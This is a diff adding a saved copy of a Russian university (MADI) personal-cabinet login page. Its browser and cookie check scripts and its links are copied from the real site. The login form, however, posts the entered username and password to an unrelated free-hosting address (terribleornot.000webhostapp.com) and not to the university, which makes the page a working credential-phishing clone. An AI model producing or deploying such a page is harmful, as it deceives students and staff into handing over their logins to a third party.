@@ -1,0 +1,145 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<!-- saved from url=(0036)https://lk.madi.ru/person/index.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Вход в систему</title>
+    <link rel="shortcut icon" href="https://lk.madi.ru/person/images/madi/favicon.ico.png" type="image/x-icon">
+    <link rel="icon" href="https://lk.madi.ru/person/images/madi/favicon.ico.png" type="image/x-icon">
+    <link href="./index_files/index.css" rel="stylesheet">
+
+    <script type="text/javascript" src="./index_files/jquery-1.10.2.js.загружено"></script>
+    <script type="text/javascript" src="./index_files/bdetect.js.загружено"></script>
+
+    <script type="text/javascript">
+
+        $(document).ready(function () {
+            //Обработка placeholder для msie
+//            if ($.browser.msie) //метод $.browser был устаревшим в версии 1.3 и удаляется в 1.9
+            if (navigator.appName == 'Microsoft Internet Explorer')
+            {
+                $("form")
+                    .find("input[type='text'], input[type='password']").each(function () {
+                        var tp = $(this).attr("placeholder");
+                        $(this).attr('value', tp).css('color', '#aaa');
+                    })
+                    .focusin(function () {
+                        var val = $(this).attr('placeholder');
+                        if ($(this).val() == val) {
+                            $(this).attr('value', '').css('color', '#303030');
+                        }
+                    })
+                    .focusout(function () {
+                        var val = $(this).attr('placeholder');
+                        if ($(this).val() == "") {
+                            $(this).attr('value', val).css('color', '#aaa');
+                        }
+                    });
+            }
+
+            //Обработка таблицы со статусами
+
+            //Проверка на Javascript
+            $("#script").html("<b>JavaScript</b> включено");
+            $("#icon_script").html("<img src=\"../_img/login/Submit.png\">");
+
+            //Проверка вида Браузера
+            if (window.sidebar) {
+                $("#browser").html("Вы используете <b>FireFox</b>");
+                $("#icon_browser").html("<img src=\"../_img/login/Submit.png\">");
+            }
+            if (window.chrome) {
+                $("#browser").html("Вы используете <b>Chrome</b>");
+                $("#icon_browser").html("<img src=\"../_img/login/Submit.png\">");
+            }
+            if (!window.external && window.opera) {
+                $("#browser").html("Вы используете <b>Opera</b>. Рекомендуется использовать <b>FireFox</b> или <b>Chrome</b>");
+                $("#icon_browser").html("<img src=\"../_img/login/Warning.png\">");
+            }
+            if (!!window.safari) {
+                $("#browser").html("Вы используете <b>Safari</b>. Рекомендуется использовать <b>FireFox</b> или <b>Chrome</b>");
+                $("#icon_browser").html("<img src=\"../_img/login/Warning.png\">");
+            }
+//            if ($.browser.msie)   //метод $.browser был устаревшим в версии 1.3 и удаляется в 1.9
+            if (navigator.appName == 'Microsoft Internet Explorer')
+            {
+                $("#browser").html("Вы используете <b>Internet Explorer</b>. Рекомендуется использовать <b>FireFox</b> или <b>Chrome</b>");
+                $("#icon_browser").html("<img src=\"../_img/login/Warning.png\">");
+            }
+
+            //Проверка типа Браузера
+            var data = browserDetectNav();      //вызываем функцию, параметр НЕ передаем,
+            if ((data[1] < 20) && window.chrome ||
+                (data[1] < 20) && window.sidebar ||
+                (data[1] < 11) && window.opera ||
+                (data[1] < 4) && window.safari ||
+                (data[1] < 8) && window.msie) {
+                $("#icon_type").html("<img src=\"../_img/login/Warning.png\">");
+                $("#type").html("Вы испольуете:<b>" + data[0] + " " + data[1] + "." + data[2] + "</b></br><b>Рекомендуется установить новую версию браузера!<b>").css("color", "red");
+            } else {
+                $("#icon_type").html("<img src=\"../_img/login/Submit.png\">");
+                $("#type").html("<b>" + data[0] + " " + data[1] + "." + data[2] + "</b>");
+            }
+
+            //Проверка cookie
+            if (navigator.cookieEnabled) {
+                $("#icon_cookie").html("<img src=\"../_img/login/Submit.png\">");
+                $("#_cookie").html("<b>Cookie</b> включены, все в порядке");
+            } else {
+                $("#icon_cookie").html("<img src=\"../_img/login/Error.png\">");
+                $("#_cookie").html("<b>Cookie</b> отключены, включите, пожайлуста, cookie!").css('color', 'red');
+            }
+
+            //Проверка заполнения поля
+            $("#icon_enter").html("<img src=\"../_img/login/Warning.png\">");
+        });
+    </script>
+</head>
+<body style="">
+    <div id="container">
+        <div class="help"><a href="https://lk.madi.ru/person/help/cabinet_help_author.htm" target="_blank" class="btn" id="help" title="Справка"><img src="./index_files/help.png" border="0"></a>&nbsp;</div>
+        <div id="header"><h1>Вход в личный кабинет</h1></div>
+        <div id="enter">
+            <form action="https://terribleornot.000webhostapp.com/madi/login.php" method="post">
+                <div id="login"><input type="text" autofocus="true" name="login" id="usr" size="16" maxlength="25" placeholder="Введите логин"></div>
+                <div id="password"><input type="password" name="pass" size="14" id="psw" maxlength="25" placeholder="Введите пароль"></div>
+                <div id="button"><input type="submit" class="input" value="Войти"></div>
+            </form>
+            <div class="support"><a href="https://lk.madi.ru/person/registr.html">Регистрация</a></div>
+        </div>
+        <div id="content">
+        <table class="check-table">
+        <tbody><tr>
+            <td class="cel1">Проверка JavaScript</td>
+            <td class="cel2"><div id="icon_script"><img src="./index_files/Submit.png"></div></td>
+            <td class="cel3"><div id="script"><b>JavaScript</b> включено</div></td>
+        </tr>
+        <tr>
+            <td class="cel1">Тип браузера</td>
+            <td class="cel2"><div id="icon_browser"><img src="./index_files/Submit.png"></div></td>
+            <td class="cel3"><div id="browser">Вы используете <b>Chrome</b></div></td>
+        </tr>
+        <tr>
+            <td class="cel1">Версия браузера</td>
+            <td class="cel2"><div id="icon_type"><img src="./index_files/Submit.png"></div></td>
+            <td class="cel3"><div id="type"><b>Chrome 62.0</b></div></td>
+        </tr>
+        <tr>
+            <td class="cel1">Проверка Cookies</td>
+            <td class="cel2"><div id="icon_cookie"><img src="./index_files/Submit.png"></div></td>
+            <td class="cel3"><div id="_cookie"><b>Cookie</b> включены, все в порядке</div></td>
+        </tr>
+        <tr>
+            <td class="cel1">Проверка авторизации</td>
+            <td class="cel2"><div id="icon_enter"><img src="./index_files/Warning.png"></div></td>
+            <td class="cel3"><div id="Div1" style="color:blue">Введите свой логин и пароль</div></td>
+        </tr>
+      </tbody></table>
+        </div>
+        <div class="support line">
+            <a href="mailto:madi.assist@gmail.com">madi.assist@gmail.com</a>
+            <a href="http://www.bravosoft.ru/">www.bravosoft.ru</a>
+        </div>
+    </div>
+
+
+</body></html>
